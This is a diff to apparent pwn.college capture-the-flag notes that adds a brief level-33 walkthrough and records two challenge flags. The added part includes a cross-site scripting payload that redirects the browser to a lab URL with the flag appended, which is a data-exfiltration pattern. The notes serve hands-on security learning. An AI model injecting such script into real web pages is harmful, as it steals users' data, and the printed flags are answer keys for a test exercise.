@@ -262,7 +262,19 @@ level-32:  > Run cat /challenge/server and get the endpoint from there and then 
 
           Flag: pwn.college{oomYHWN0y3lXDMNiqa3bLu5TtXA.0VNxATNxwyN1YTN0EzW}
 
-level-33:  > 
+level-33:  >  Run cat /challenge/server and get the endpoint from there and then run /challenge/server.
+           >  open a new file and write the script.
+           >  <script src="/gateway"></script>
+              <script>
+                    window.location="http://challenge.localhost:80/~hacker/?"+flag;
+              </script>
+           >  run /challenge/client
+           > get the flag .
+
+          Flag: wn.college{cnxNkvnbnNXQEYRHHXzTt4-bNuY.0lNxATNxwyN1YTN0EzW}
+
+level-34:  
+
 
 
 
